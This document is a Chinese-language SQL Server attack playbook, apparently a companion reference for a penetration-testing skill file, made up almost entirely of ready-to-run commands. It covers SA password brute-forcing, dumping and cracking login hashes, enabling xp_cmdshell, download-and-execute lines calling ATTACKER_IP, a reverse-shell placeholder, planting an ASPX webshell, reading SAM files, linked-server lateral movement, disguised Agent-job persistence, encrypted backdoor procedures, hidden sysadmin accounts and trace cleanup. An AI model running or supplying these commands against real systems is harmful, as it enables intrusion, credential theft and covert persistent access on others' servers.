# SQL Server 攻击技术参考

> 本文档是 SKILL.md 各 Phase 的详细命令与技术补充。

---

## 1. 认证与连接

### 利用条件
- SQL Server 监听 1433 端口且可达
- 目标启用 SQL Server 认证或混合模式认证
- 已获取有效凭据或存在弱口令

### sqlcmd 连接

```bash
# SQL Server 认证
sqlcmd -S TARGET,1433 -U sa -P 'password' -Q "SELECT @@version;"

# 指定数据库连接
sqlcmd -S TARGET -U sa -P 'password' -d master -Q "SELECT 1;"

# Windows 认证（当前域凭据）
sqlcmd -S TARGET -E -Q "SELECT @@version;"

# 指定端口
sqlcmd -S TARGET,1433 -U sa -P 'password' -Q "SELECT 1;"

# 命名实例连接
sqlcmd -S TARGET\INSTANCENAME -U sa -P 'password' -Q "SELECT 1;"
```

### mssqlclient.py 连接（Impacket）

```bash
# SQL Server 认证
mssqlclient.py sa:'password'@TARGET -port 1433

# Windows 认证
mssqlclient.py DOMAIN/user:'password'@TARGET -windows-auth

# 使用 NTLM Hash（Pass-the-Hash）
mssqlclient.py sa@TARGET -hashes :NTHASH

# 使用 Kerberos 票据
mssqlclient.py DOMAIN/user@TARGET -k -no-pass
```

### sqsh 连接

```bash
# 基本连接
sqsh -S TARGET:1433 -U sa -P 'password'

# 指定数据库
sqsh -S TARGET:1433 -U sa -P 'password' -D master
```

### SA 弱口令检测

```bash
# 手动逐个尝试
sqlcmd -S TARGET -U sa -P '' -Q "SELECT 1;"
sqlcmd -S TARGET -U sa -P 'sa' -Q "SELECT 1;"
sqlcmd -S TARGET -U sa -P 'password' -Q "SELECT 1;"
sqlcmd -S TARGET -U sa -P '123456' -Q "SELECT 1;"
sqlcmd -S TARGET -U sa -P 'admin' -Q "SELECT 1;"
sqlcmd -S TARGET -U sa -P 'Password1' -Q "SELECT 1;"
sqlcmd -S TARGET -U sa -P 'P@ssw0rd' -Q "SELECT 1;"
sqlcmd -S TARGET -U sa -P 'sql2019' -Q "SELECT 1;"

# Hydra 爆破
hydra -l sa -P passwords.txt TARGET mssql

# Nmap 爆破脚本
nmap -p 1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=passwords.txt TARGET

# Medusa
medusa -h TARGET -u sa -P passwords.txt -M mssql

# Metasploit
msf> use auxiliary/scanner/mssql/mssql_login
msf> set RHOSTS TARGET
msf> set USERNAME sa
msf> set PASS_FILE /usr/share/wordlists/rockyou.txt
msf> run
```

### 攻击效果
- 成功登录后可查询数据库数据
- SA 账户默认拥有 sysadmin 角色，可执行任意操作

---

## 2. 数据库枚举

### 利用条件
- 已获取有效的数据库连接
- 至少拥有 public 角色权限

### 系统数据库与用户数据库

```sql
-- 列出所有数据库
SELECT name, database_id, create_date FROM sys.databases;

-- 仅列出用户数据库
SELECT name FROM sys.databases WHERE database_id > 4;

-- 当前数据库
SELECT DB_NAME();
```

### 表与列枚举

```sql
-- 列出当前数据库的所有表
SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';

-- 列出指定表的所有列
SELECT COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'target_table';

-- 搜索包含敏感关键词的表名
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES
WHERE TABLE_NAME LIKE '%user%' OR TABLE_NAME LIKE '%password%'
   OR TABLE_NAME LIKE '%credential%' OR TABLE_NAME LIKE '%account%';

-- 搜索包含敏感关键词的列名
SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
WHERE COLUMN_NAME LIKE '%password%' OR COLUMN_NAME LIKE '%secret%'
   OR COLUMN_NAME LIKE '%token%' OR COLUMN_NAME LIKE '%hash%';

-- 使用 sysobjects 枚举（兼容旧版本）
SELECT name FROM sysobjects WHERE xtype = 'U';  -- 用户表
SELECT name FROM sysobjects WHERE xtype = 'P';  -- 存储过程
SELECT name FROM sysobjects WHERE xtype = 'V';  -- 视图
```

### 存储过程枚举

```sql
-- 列出所有用户存储过程
SELECT name, type_desc FROM sys.objects WHERE type = 'P';

-- 获取存储过程源代码
EXEC sp_helptext 'procedure_name';

-- 搜索可能包含凭据的存储过程
SELECT OBJECT_NAME(object_id), definition
FROM sys.sql_modules
WHERE definition LIKE '%password%' OR definition LIKE '%credential%';
```

### 攻击效果
- 了解数据库结构，定位敏感数据
- 发现包含硬编码凭据的存储过程

---

## 3. 凭据提取

### 利用条件
- 拥有 sysadmin 权限（访问 sys.sql_logins 需要）
- 或拥有 CONTROL SERVER 权限

### SQL Server 登录哈希

```sql
-- 提取所有 SQL Server 登录的密码哈希
SELECT name, CONVERT(VARCHAR(MAX), password_hash, 1) AS password_hash
FROM sys.sql_logins;

-- 列出所有服务器级主体
SELECT name, type_desc, is_disabled, create_date, modify_date
FROM sys.server_principals;

-- 列出 sysadmin 成员
SELECT p.name
FROM sys.server_role_members rm
JOIN sys.server_principals p ON rm.member_principal_id = p.principal_id
JOIN sys.server_principals r ON rm.role_principal_id = r.principal_id
WHERE r.name = 'sysadmin';

-- 列出数据库级用户
SELECT name, type_desc FROM sys.database_principals WHERE type NOT IN ('R');
```

### 哈希破解

```bash
# SQL Server 2012+ 哈希格式（SHA-512）
# hashcat 模式 1731
hashcat -m 1731 hash.txt wordlist.txt

# SQL Server 2005-2008 哈希格式（SHA-1）
# hashcat 模式 131
hashcat -m 131 hash.txt wordlist.txt

# John the Ripper
john --format=mssql12 hash.txt --wordlist=wordlist.txt
```

### 关键判断
- `password_hash` 为 0x0100 开头 -> SQL Server 2005 (SHA-1)
- `password_hash` 为 0x0200 开头 -> SQL Server 2012+ (SHA-512)

---

## 4. xp_cmdshell RCE

### 利用条件
- 拥有 sysadmin 角色权限
- SQL Server 服务账户具有操作系统权限
- `xp_cmdshell` 可通过 `sp_configure` 启用

### 启用与执行

```sql
-- 检查 xp_cmdshell 当前状态
EXEC sp_configure 'xp_cmdshell';

-- 启用 xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- 执行系统命令
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig /all';
EXEC xp_cmdshell 'net user';
EXEC xp_cmdshell 'net localgroup administrators';
EXEC xp_cmdshell 'dir C:\Users\';
EXEC xp_cmdshell 'type C:\Windows\System32\drivers\etc\hosts';

-- 执行 PowerShell
EXEC xp_cmdshell 'powershell -Command "Get-Process"';

-- 反弹 Shell（PowerShell Base64）
EXEC xp_cmdshell 'powershell -e <BASE64_ENCODED_PAYLOAD>';

-- 下载并执行
EXEC xp_cmdshell 'powershell -Command "IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER_IP/payload.ps1'')"';

-- certutil 下载
EXEC xp_cmdshell 'certutil -urlcache -split -f http://ATTACKER_IP/payload.exe C:\Windows\Temp\payload.exe';
EXEC xp_cmdshell 'C:\Windows\Temp\payload.exe';

-- 禁用 xp_cmdshell（清理痕迹）
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;
EXEC sp_configure 'show advanced options', 0;
RECONFIGURE;
```

### mssqlclient.py 快速利用

```bash
# 连接后直接使用
mssqlclient.py sa:'password'@TARGET
# SQL> enable_xp_cmdshell
# SQL> xp_cmdshell whoami
# SQL> xp_cmdshell ipconfig
# SQL> disable_xp_cmdshell
```

### 攻击效果
- 以 SQL Server 服务账户身份执行任意操作系统命令
- 服务账户通常为 `NT SERVICE\MSSQLSERVER` 或自定义服务账户
- 如果服务以 `NT AUTHORITY\SYSTEM` 运行则直接获取最高权限

---

## 5. sp_OACreate COM 对象 RCE

### 利用条件
- 拥有 sysadmin 角色权限
- xp_cmdshell 被禁用或被监控，需要替代方案
- OLE Automation Procedures 可启用

### 启用与执行

```sql
-- 启用 OLE Automation Procedures
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

-- 通过 wscript.shell 执行命令（无回显）
DECLARE @shell INT;
EXEC sp_oacreate 'wscript.shell', @shell OUTPUT;
EXEC sp_oamethod @shell, 'run', NULL, 'cmd /c whoami > C:\temp\output.txt';

-- 通过 Shell.Application 执行命令
DECLARE @app INT;
EXEC sp_oacreate 'Shell.Application', @app OUTPUT;
EXEC sp_oamethod @app, 'ShellExecute', NULL, 'cmd.exe', '/c whoami > C:\temp\out.txt', '', 'open', 0;

-- 通过 Scripting.FileSystemObject 写文件
DECLARE @fs INT, @file INT;
EXEC sp_oacreate 'Scripting.FileSystemObject', @fs OUTPUT;
EXEC sp_oamethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.aspx', 1;
EXEC sp_oamethod @file, 'Write', NULL, '<%@ Page Language="C#" %><%System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"]);%>';
EXEC sp_oamethod @file, 'Close';

-- 获取命令输出（通过临时表 + xp_cmdshell 读文件或 BULK INSERT）
CREATE TABLE #output (line VARCHAR(MAX));
BULK INSERT #output FROM 'C:\temp\output.txt';
SELECT * FROM #output;
DROP TABLE #output;

-- 禁用 OLE Automation（清理）
EXEC sp_configure 'Ole Automation Procedures', 0;
RECONFIGURE;
```

### 关键判断
- sp_OACreate 执行命令无直接回显，需配合文件写入 + 读取
- 比 xp_cmdshell 隐蔽，不会被常见安全工具监控
- 部分 EDR 可能监控 OLE Automation 的 COM 对象创建

---

## 6. 文件读写

### 利用条件
- BULK INSERT 需要 ADMINISTER BULK OPERATIONS 权限（sysadmin 自动拥有）
- OPENROWSET 需要启用 Ad Hoc Distributed Queries
- SQL Server 服务账户对目标文件有读取/写入权限

### BULK INSERT 文件读取

```sql
-- 读取文本文件
CREATE TABLE #tmp (line VARCHAR(MAX));
BULK INSERT #tmp FROM 'C:\Windows\System32\drivers\etc\hosts';
SELECT * FROM #tmp;
DROP TABLE #tmp;

-- 读取 web.config
CREATE TABLE #config (line VARCHAR(MAX));
BULK INSERT #config FROM 'C:\inetpub\wwwroot\web.config';
SELECT * FROM #config;
DROP TABLE #config;

-- 读取 Windows SAM 备份（需高权限）
CREATE TABLE #sam (line VARCHAR(MAX));
BULK INSERT #sam FROM 'C:\Windows\repair\SAM';
SELECT * FROM #sam;
DROP TABLE #sam;
```

### OPENROWSET 文件读取

```sql
-- 启用 Ad Hoc Distributed Queries
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'Ad Hoc Distributed Queries', 1;
RECONFIGURE;

-- 读取文件为单个 CLOB
SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS Contents;

-- 读取二进制文件
SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\config\SAM', SINGLE_BLOB) AS Contents;
```

### bcp 数据导出

```bash
# 导出查询结果到文件
bcp "SELECT * FROM master.sys.databases" queryout C:\temp\databases.txt -S TARGET -U sa -P 'password' -c

# 导出整张表
bcp DATABASE_NAME.dbo.table_name out C:\temp\table_data.csv -S TARGET -U sa -P 'password' -c -t ","
```

### 通过 xp_cmdshell 写文件

```sql
-- 使用 echo 写文件
EXEC xp_cmdshell 'echo ^<%@ Page Language="C#" %^> > C:\inetpub\wwwroot\shell.aspx';

-- 使用 certutil 下载文件
EXEC xp_cmdshell 'certutil -urlcache -split -f http://ATTACKER_IP/payload.exe C:\Windows\Temp\payload.exe';

-- 使用 PowerShell 下载
EXEC xp_cmdshell 'powershell -Command "(New-Object Net.WebClient).DownloadFile(''http://ATTACKER_IP/file'', ''C:\temp\file'')"';
```

### 攻击效果
- 读取配置文件（web.config）中的数据库连接字符串和密钥
- 读取系统敏感文件（hosts、SAM 备份）
- 写入 webshell 实现持久化访问

---

## 7. Linked Server 横向移动

### 利用条件
- 目标 SQL Server 配置了 Linked Server
- Linked Server 映射的账户拥有远程服务器权限
- 最理想情况：映射账户在远程服务器拥有 sysadmin 权限

### 枚举 Linked Server

```sql
-- 列出所有 Linked Server
EXEC sp_linkedservers;

-- 获取 Linked Server 详细信息
SELECT name, data_source, provider, product FROM sys.servers WHERE is_linked = 1;

-- 检查 Linked Server 登录映射
EXEC sp_helplinkedsrvlogin;

-- 测试 Linked Server 连通性
EXEC sp_testlinkedserver 'LINKED_SERVER';
```

### 通过 OPENQUERY 执行

```sql
-- 在远程服务器执行查询
SELECT * FROM OPENQUERY(LINKED_SERVER, 'SELECT @@servername');
SELECT * FROM OPENQUERY(LINKED_SERVER, 'SELECT @@version');
SELECT * FROM OPENQUERY(LINKED_SERVER, 'SELECT name FROM sys.databases');

-- 远程枚举用户
SELECT * FROM OPENQUERY(LINKED_SERVER, 'SELECT name FROM sys.server_principals');

-- 远程提取凭据
SELECT * FROM OPENQUERY(LINKED_SERVER, 'SELECT name, CONVERT(VARCHAR(MAX), password_hash, 1) FROM sys.sql_logins');
```

### 通过 EXEC AT 执行

```sql
-- 在远程服务器执行 xp_cmdshell
EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;') AT LINKED_SERVER;
EXEC ('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT LINKED_SERVER;
EXEC ('EXEC xp_cmdshell ''whoami'';') AT LINKED_SERVER;

-- 远程创建用户
EXEC ('CREATE LOGIN attacker WITH PASSWORD = ''P@ssw0rd!'';') AT LINKED_SERVER;
EXEC ('EXEC sp_addsrvrolemember ''attacker'', ''sysadmin'';') AT LINKED_SERVER;
```

### 嵌套 Linked Server（多跳）

```sql
-- 双跳：A -> B -> C
SELECT * FROM OPENQUERY(SERVER_B, '
    SELECT * FROM OPENQUERY(SERVER_C, ''SELECT @@servername'')
');

-- 三跳：A -> B -> C -> D
SELECT * FROM OPENQUERY(SERVER_B, '
    SELECT * FROM OPENQUERY(SERVER_C, ''
        SELECT * FROM OPENQUERY(SERVER_D, ''''SELECT @@servername'''')
    '')
');
```

### 创建 Linked Server（建立新连接）

```sql
-- 添加 Linked Server
EXEC sp_addlinkedserver
    @server = 'ATTACKER_SQL',
    @srvproduct = '',
    @provider = 'SQLOLEDB',
    @datasrc = 'ATTACKER_IP';

-- 配置登录映射
EXEC sp_addlinkedsrvlogin
    @rmtsrvname = 'ATTACKER_SQL',
    @useself = 'false',
    @rmtuser = 'sa',
    @rmtpassword = 'password';

-- 启用 RPC OUT（允许远程执行存储过程）
EXEC sp_serveroption 'ATTACKER_SQL', 'rpc out', 'true';
```

### 关键判断
- Linked Server 列表为空 -> 无横向移动路径，尝试其他方法
- 远程权限为 sysadmin -> 可在远程服务器执行 xp_cmdshell
- 多个 Linked Server 形成链 -> 可实现多跳横向移动

---

## 8. SQL Agent Job 持久化

### 利用条件
- SQL Server Agent 服务正在运行
- 拥有 sysadmin 角色或 msdb 数据库的 SQLAgentOperatorRole
- 需要持久化或定时执行命令

### 检查 SQL Agent 状态

```sql
-- 检查 Agent 服务状态
SELECT dss.status_desc
FROM sys.dm_server_services dss
WHERE servicename LIKE '%Agent%';

-- 列出现有 Job
EXEC msdb.dbo.sp_help_job;

-- 查看 Job 步骤详情
EXEC msdb.dbo.sp_help_jobstep @job_name = 'job_name';

-- 搜索可能的后门 Job
SELECT j.name, js.step_name, js.command
FROM msdb.dbo.sysjobs j
JOIN msdb.dbo.sysjobsteps js ON j.job_id = js.job_id
WHERE js.command LIKE '%xp_cmdshell%'
   OR js.command LIKE '%powershell%'
   OR js.command LIKE '%cmd /c%';
```

### 创建持久化 Job

```sql
-- 创建 Job
USE msdb;
EXEC dbo.sp_add_job
    @job_name = 'SystemHealthCheck',
    @enabled = 1;

-- 添加 CmdExec 步骤（直接执行系统命令）
EXEC dbo.sp_add_jobstep
    @job_name = 'SystemHealthCheck',
    @step_name = 'RunCommand',
    @subsystem = 'CmdExec',
    @command = 'powershell -e <BASE64_PAYLOAD>';

-- 添加 TSQL 步骤（通过 xp_cmdshell）
EXEC dbo.sp_add_jobstep
    @job_name = 'SystemHealthCheck',
    @step_name = 'RunSQL',
    @subsystem = 'TSQL',
    @command = 'EXEC xp_cmdshell ''whoami'';',
    @database_name = 'master';

-- 绑定到服务器
EXEC dbo.sp_add_jobserver
    @job_name = 'SystemHealthCheck';

-- 立即执行
EXEC dbo.sp_start_job @job_name = 'SystemHealthCheck';
```

### 添加定时计划

```sql
-- 每天凌晨 1 点执行
EXEC dbo.sp_add_schedule
    @schedule_name = 'NightlyRun',
    @freq_type = 4,          -- 每天
    @freq_interval = 1,
    @active_start_time = 010000;  -- 01:00:00

EXEC dbo.sp_attach_schedule
    @job_name = 'SystemHealthCheck',
    @schedule_name = 'NightlyRun';

-- 每隔 10 分钟执行
EXEC dbo.sp_add_schedule
    @schedule_name = 'FrequentRun',
    @freq_type = 4,
    @freq_interval = 1,
    @freq_subday_type = 4,   -- 分钟
    @freq_subday_interval = 10;

EXEC dbo.sp_attach_schedule
    @job_name = 'SystemHealthCheck',
    @schedule_name = 'FrequentRun';
```

### 清理

```sql
-- 删除 Job
EXEC msdb.dbo.sp_delete_job @job_name = 'SystemHealthCheck';
```

### 攻击效果
- 实现命令的定时自动执行（持久化）
- Job 以 SQL Server Agent 服务账户身份运行
- 比直接使用 xp_cmdshell 更隐蔽

---

## 9. 存储过程利用

### 利用条件
- CLR Assembly 需要 sysadmin 且启用 clr enabled
- 扩展存储过程需要 sysadmin 权限
- 自定义恶意存储过程需要 CREATE PROCEDURE 权限

### CLR Assembly RCE

```sql
-- 启用 CLR
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'clr enabled', 1;
RECONFIGURE;

-- 设置数据库为 TRUSTWORTHY（CLR 要求）
ALTER DATABASE master SET TRUSTWORTHY ON;

-- 从十六进制创建 Assembly（避免需要上传 DLL）
CREATE ASSEMBLY cmd_exec
FROM 0x4D5A900003...  -- 编译后的 .NET DLL 十六进制
WITH PERMISSION_SET = UNSAFE;

-- 创建存储过程映射到 Assembly
CREATE PROCEDURE [dbo].[cmd_exec] @cmd NVARCHAR(4000)
AS EXTERNAL NAME [cmd_exec].[StoredProcedures].[cmd_exec];

-- 执行命令
EXEC cmd_exec 'whoami';

-- 清理
DROP PROCEDURE cmd_exec;
DROP ASSEMBLY cmd_exec;
ALTER DATABASE master SET TRUSTWORTHY OFF;
EXEC sp_configure 'clr enabled', 0;
RECONFIGURE;
```

### 恶意存储过程

```sql
-- 创建封装 xp_cmdshell 的存储过程（隐藏真实意图）
CREATE PROCEDURE sp_SystemCheck @cmd NVARCHAR(4000)
AS
BEGIN
    EXEC xp_cmdshell @cmd;
END;

-- 调用
EXEC sp_SystemCheck 'whoami';

-- 创建加密存储过程（防止源代码被查看）
CREATE PROCEDURE sp_HiddenCmd @cmd NVARCHAR(4000)
WITH ENCRYPTION
AS
BEGIN
    EXEC xp_cmdshell @cmd;
END;
```

### 搜索危险存储过程

```sql
-- 搜索引用危险操作的存储过程
SELECT OBJECT_NAME(object_id) AS proc_name, definition
FROM sys.sql_modules
WHERE definition LIKE '%xp_cmdshell%'
   OR definition LIKE '%sp_oacreate%'
   OR definition LIKE '%OPENROWSET%'
   OR definition LIKE '%sp_addlinkedserver%';

-- 搜索 EXECUTE AS 提权的存储过程
SELECT OBJECT_NAME(object_id) AS proc_name, execute_as_principal_id
FROM sys.sql_modules
WHERE execute_as_principal_id IS NOT NULL;
```

### 关键判断
- CLR Assembly 比 xp_cmdshell 更隐蔽但配置更复杂
- 加密存储过程可隐藏后门代码
- EXECUTE AS 存储过程可能允许低权限用户执行高权限操作

---

## 10. 用户创建与提权

### 利用条件
- 创建登录需要 ALTER ANY LOGIN 或 sysadmin
- 角色赋予需要 ALTER ANY SERVER ROLE 或 sysadmin
- IMPERSONATE 提权需要目标用户已授予 IMPERSONATE 权限

### 创建后门账户

```sql
-- 创建 SQL Server 登录
CREATE LOGIN backdoor WITH PASSWORD = 'C0mpl3x!P@ss';

-- 赋予 sysadmin 角色
EXEC sp_addsrvrolemember 'backdoor', 'sysadmin';

-- 创建数据库用户
USE target_database;
CREATE USER backdoor FOR LOGIN backdoor;

-- 赋予 db_owner 角色
EXEC sp_addrolemember 'db_owner', 'backdoor';

-- 隐蔽创建（使用不起眼的名字）
CREATE LOGIN sql_monitor WITH PASSWORD = 'M0n!t0r2024';
EXEC sp_addsrvrolemember 'sql_monitor', 'sysadmin';
```

### IMPERSONATE 提权

```sql
-- 检查当前用户可以模拟谁
SELECT DISTINCT grantee_principal_id, p.name AS grantee, p2.name AS impersonatable
FROM sys.server_permissions sp
JOIN sys.server_principals p ON sp.grantee_principal_id = p.principal_id
JOIN sys.server_principals p2 ON sp.grantor_principal_id = p2.principal_id
WHERE sp.permission_name = 'IMPERSONATE';

-- 模拟 SA 执行命令
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;  -- 确认当前身份
EXEC xp_cmdshell 'whoami';
REVERT;

-- 模拟后创建后门
EXECUTE AS LOGIN = 'sa';
CREATE LOGIN attacker WITH PASSWORD = 'P@ssw0rd!';
EXEC sp_addsrvrolemember 'attacker', 'sysadmin';
REVERT;
```

### db_owner 提权

```sql
-- db_owner 可以通过 EXECUTE AS OWNER 获取 dbo 权限
USE target_database;
EXECUTE AS USER = 'dbo';

-- 如果 dbo 映射到 SA 登录，则可以执行 SA 级操作
SELECT SYSTEM_USER;

-- 通过 TRUSTWORTHY + db_owner 提权到 sysadmin
-- 前提：目标数据库 TRUSTWORTHY = ON，且 dbo 映射到 sysadmin 登录
ALTER DATABASE target_database SET TRUSTWORTHY ON;
USE target_database;
CREATE PROCEDURE sp_escalate
WITH EXECUTE AS OWNER
AS
EXEC sp_addsrvrolemember 'lowpriv_user', 'sysadmin';
GO
EXEC sp_escalate;
```

### 修改现有账户

```sql
-- 重置 SA 密码
ALTER LOGIN sa WITH PASSWORD = 'NewP@ssw0rd!';

-- 启用已禁用的 SA 账户
ALTER LOGIN sa ENABLE;

-- 修改其他用户密码
ALTER LOGIN target_user WITH PASSWORD = 'NewPass!';
```

### 攻击效果
- 创建隐蔽的后门账户用于持久化访问
- 通过 IMPERSONATE 实现低权限到高权限的提升
- 重置 SA 密码可直接获取最高权限（但会被发现）
